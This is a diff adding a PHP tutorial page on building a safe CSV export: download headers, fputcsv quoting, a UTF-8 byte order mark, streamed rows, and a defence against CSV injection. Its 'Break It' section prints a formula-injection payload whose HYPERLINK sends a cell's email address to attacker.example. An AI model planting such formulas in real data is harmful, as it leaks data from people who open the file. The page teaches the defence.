@@ -1,0 +1,235 @@
+<layout name="default" title="Exporting Data" />
+<page-head>
+    <meta
+        name="description"
+        content="A CSV export that opens cleanly in any spreadsheet: a download name with Content-Disposition, rows streamed from MySQL, fputcsv() quoting, UTF-8 with a byte order mark, and the fix for CSV injection, where a cell someone typed runs as a formula. A project in Web Nerdism w/ PHP 101."
+    />
+    <meta
+        name="keywords"
+        content="PHP CSV export, fputcsv, Content-Disposition attachment filename, CSV injection, formula injection, spreadsheet injection, HYPERLINK, byte order mark, Excel UTF-8, unbuffered query, learn PHP"
+    />
+    <meta
+        property="og:description"
+        content="A CSV download, and the attack hiding in a spreadsheet cell. A project in Web Nerdism w/ PHP 101."
+    />
+</page-head>
+<article>
+    <spaced>
+        <p class="text-sm"><lnk to="/php">Web Nerdism w/ PHP 101</lnk> &rsaquo; Projects</p>
+        <heading h1 id="exporting-data">Exporting Data</heading>
+        <byline date="Nov 2026">Phillip Harrington</byline>
+
+        <!-- Intro -->
+        <p>
+            Sooner or later, someone asks for the orders, or the customers, "in Excel." A CSV file
+            is the answer: plain text, one row per line, commas between the values, and every
+            spreadsheet opens it. You'll build an export of a contacts table that downloads with a
+            sensible name, streams rows straight from the database, and survives commas, quotes and
+            every alphabet.
+        </p>
+        <p>
+            It also has to survive the people who filled in the table. A spreadsheet doesn't only
+            show text; it runs formulas, and a name typed into your signup form can be one. You'll
+            export that name the naive way, see it come out as a working formula, and then make
+            every cell safe.
+        </p>
+
+        <!-- What you'll use -->
+        <heading h2 id="what-youll-use">What You'll Use</heading>
+        <list>
+            <li>
+                <lnk to="/php/sending-a-file">Sending a File</lnk>: <cde>Content-Type</cde>, and
+                <cde>Content-Disposition</cde> for the download name
+            </li>
+            <li><lnk to="/php/csv">CSV</lnk>: the format, and <cde>fputcsv()</cde></li>
+            <li>
+                <lnk to="/php/text-and-utf-8">Text and UTF-8</lnk>: the byte order mark Excel wants
+            </li>
+            <li>
+                <lnk to="/php/projects/http-authentication">HTTP Authentication</lnk>: customer data
+                is staff only
+            </li>
+            <li>
+                <lnk to="/php/never-trust-input">Never Trust Input</lnk>: input that waits in your
+                database for a spreadsheet
+            </li>
+        </list>
+
+        <!-- Build it -->
+        <heading h2 id="build-it">Build It</heading>
+
+        <heading h3 id="step-1-the-contacts">Step 1: The Contacts</heading>
+        <p>
+            The containers, <cde>Dockerfile</cde> and <cde>src/db.php</cde> are the usual ones from
+            <lnk to="/php/projects/translation">Translation</lnk>, with the database called
+            <cde>crm</cde>. Copy <cde>auth.php</cde> and <cde>users.php</cde> from
+            <lnk to="/php/projects/http-authentication">HTTP Authentication</lnk>. Then some
+            contacts, all of whom came in through a form:
+        </p>
+        <code-block example="project-exporting-data/init.sql" />
+        <p>
+            A comma in a company name, quotes in another, three alphabets, and two values that start
+            with characters a spreadsheet treats specially. One of them is an attack.
+        </p>
+
+        <heading h3 id="step-2-safe-cells">Step 2: Safe Cells</heading>
+        <code-block example="project-exporting-data/src/csv.php" />
+        <p>
+            <cde>spreadsheetSafe()</cde> puts an apostrophe in front of any text that starts with
+            <cde>=</cde>, <cde>+</cde>, <cde>-</cde>, <cde>@</cde>, a tab or a carriage return.
+            Spreadsheets read a leading apostrophe as "this is text," and don't show it. Plain
+            numbers are left alone, so a refund of <cde>-5.00</cde> stays a number.
+        </p>
+        <p>
+            <cde>writeRow()</cde> hands each row to <cde>fputcsv()</cde>, which does the quoting: a
+            value with a comma, quote or line break in it is wrapped in quotes, and quotes inside
+            are doubled.
+        </p>
+
+        <heading h3 id="step-3-the-download">Step 3: The Download</heading>
+        <code-block example="project-exporting-data/public/export.php" />
+        <list>
+            <li>
+                <strong><cde>Content-Disposition: attachment</cde></strong> tells the browser to
+                save the response instead of showing it, and <cde>filename</cde> names the file. The
+                name is built only from things we made: a fixed word and dates we formatted
+                ourselves.
+            </li>
+            <li>
+                <strong>The <cde>?since=</cde> date</strong> is input, so it must be a real date in
+                exactly one shape, checked by parsing it and formatting it back. February 31st
+                doesn't survive the trip.
+            </li>
+            <li>
+                <strong>The byte order mark</strong>, three bytes at the very start, is how Excel
+                knows the file is UTF-8. Without it, Excel on Windows often guesses an older
+                encoding, and <cde>Zoë</cde> opens as <cde>ZoÃ«</cde>.
+            </li>
+            <li>
+                <strong>The rows stream.</strong> With buffering off, PDO hands over each row as
+                MySQL sends it, and <cde>fputcsv()</cde> writes it straight to the response. A
+                million rows never sit in memory at once.
+            </li>
+        </list>
+
+        <heading h3 id="step-4-run-it">Step 4: Run It</heading>
+        <!-- prettier-ignore -->
+        <code-block>docker compose up</code-block>
+        <p>
+            Open <cde>http://localhost:8000/export.php</cde>, log in as <cde>editor</cde>, and the
+            browser saves <cde>contacts-</cde> plus today's date. Or with curl, where
+            <cde>-OJ</cde> saves under the name the server sent:
+        </p>
+        <!-- prettier-ignore -->
+        <code-block>curl -u 'editor:correct horse battery staple' -OJ http://localhost:8000/export.php
+curl -u 'editor:correct horse battery staple' -OJ 'http://localhost:8000/export.php?since=2026-11-15'</code-block>
+        <p>
+            Open the file in any spreadsheet. Every row has five columns, <cde>Acme, Inc.</cde> is
+            one cell, the accents and the Japanese name are intact, and the strange name is just
+            text.
+        </p>
+        <p class="text-th-muted text-base">
+            New to Docker or the terminal? <lnk to="/php/tools">Tools</lnk> has the setup.
+        </p>
+
+        <!-- Break it -->
+        <heading h2 id="break-it">Break It</heading>
+        <p>The export most people write first:</p>
+        <code-block example="project-exporting-data/public/naive-export.php" />
+        <!-- prettier-ignore -->
+        <code-block>curl http://localhost:8000/naive-export.php</code-block>
+        <!-- prettier-ignore -->
+        <code-block>Name,Email,Company,Spent
+Ann Lee,ann@example.com,Acme, Inc.,42
+Zoë Łukasiewicz,zoe@example.com,Café "Kraków",13.99
+...
+=HYPERLINK("https://attacker.example/?leak="&amp;B2,"Click for details"),mallory@example.com,Totally Real Ltd,0</code-block>
+        <p>
+            Two things broke. The small one: <cde>Acme, Inc.</cde> became two cells, and Ann's row
+            has one column too many. Every row after a stray comma is shifted and wrong.
+        </p>
+        <p>
+            The big one is the fourth row. Open the file in a spreadsheet, and the name cell isn't a
+            name. It's a link that says "Click for details," and clicking it sends the contents of
+            cell B2, someone's email address, to <cde>attacker.example</cde>. Change the formula and
+            it can pull in other cells, other rows, the whole sheet. Some spreadsheet programs have
+            supported formulas that start other programs, behind a warning that people click
+            through. This is CSV injection, also called formula injection: the attacker typed a
+            formula into your signup form months ago, and it runs on your staff's computer the day
+            someone exports the list.
+        </p>
+        <heading h2 id="fix-it">Fix It</heading>
+        <p>
+            <strong>Never trust input,</strong> and that includes input that's been sitting in your
+            database. Look at the real export's version of the same row:
+        </p>
+        <!-- prettier-ignore -->
+        <code-block>"'=HYPERLINK(""https://attacker.example/?leak=""&amp;B2,""Click for details"")",mallory@example.com,"Totally Real Ltd",0.00,"2026-11-20 08:00:00"</code-block>
+        <p>
+            Quoted, so the commas inside stay inside. Quotes doubled. And the apostrophe in front,
+            so the spreadsheet shows the text <cde>=HYPERLINK(...)</cde> and never runs it. Then
+            delete <cde>naive-export.php</cde>.
+        </p>
+
+        <side-story title="Older Than Its Spec">
+            Comma-separated values were in use by the early 1970s, long before personal computers,
+            and for decades nobody wrote down exactly how they work. RFC 4180, published in 2005,
+            finally described the common format: commas between fields, quotes around fields that
+            need them, quotes inside doubled. It says itself that it documents a format already in
+            wide use, with many variations, which is why every CSV reader still has to be a little
+            forgiving.
+        </side-story>
+
+        <!-- Gotchas -->
+        <heading h2 id="gotchas">Gotchas</heading>
+        <list>
+            <li>
+                <strong>The apostrophe changes the data.</strong> A phone number like
+                <cde>+1 (555) 0100</cde> gets one too. If the file is going to another program, not
+                a person with a spreadsheet, it may want the raw values. Make the safe version the
+                default, and the raw one a deliberate choice.
+            </li>
+            <li>
+                <strong>Pass <cde>fputcsv()</cde> all its arguments.</strong> Its old default for
+                <cde>$escape</cde>, a backslash, doesn't match how spreadsheets read quotes, and PHP
+                8.4 warns when you leave it out. Pass <cde>''</cde>.
+            </li>
+            <li>
+                <strong>Never build the file name from input as-is.</strong> A quote or a line break
+                in a <cde>Content-Disposition</cde> filename can break the header. Build it from
+                values you formatted yourself, or strip it to letters, digits and hyphens.
+            </li>
+            <li>
+                <strong>Output before the headers ruins the download.</strong> A stray space or
+                warning before <cde>header()</cde> means the headers can't be sent, and the browser
+                shows a page of commas instead of saving a file.
+            </li>
+            <li>
+                <strong>An export is a copy of your data, walking out the door.</strong> Put it
+                behind a login, log who ran it, and export only the columns people need.
+            </li>
+        </list>
+
+        <!-- $2 tip -->
+        <two-dollars title="Open your exports in a real spreadsheet">
+            <p>
+                Reading a CSV in a text editor tells you it's well formed. Opening it in Excel,
+                LibreOffice or Google Sheets tells you whether a person can use it: whether the
+                accents survived, the dates are dates, and the long ids didn't turn into
+                <cde>1.23E+15</cde>. Do both, at least once, with the ugliest data you have.
+            </p>
+        </two-dollars>
+
+        <p>
+            The contacts came from somewhere, and some came because someone sent them. Next: an
+            affiliate program, which pays people for sending you customers.
+        </p>
+
+        <!-- Next -->
+        <hr />
+        <nav aria-label="Lesson" class="flex justify-between gap-4 text-sm">
+            <lnk to="/php">&larr; Web Nerdism w/ PHP 101</lnk>
+            <lnk to="/php/projects/affiliate-program">Next: Affiliate Program &rarr;</lnk>
+        </nav>
+    </spaced>
+</article>
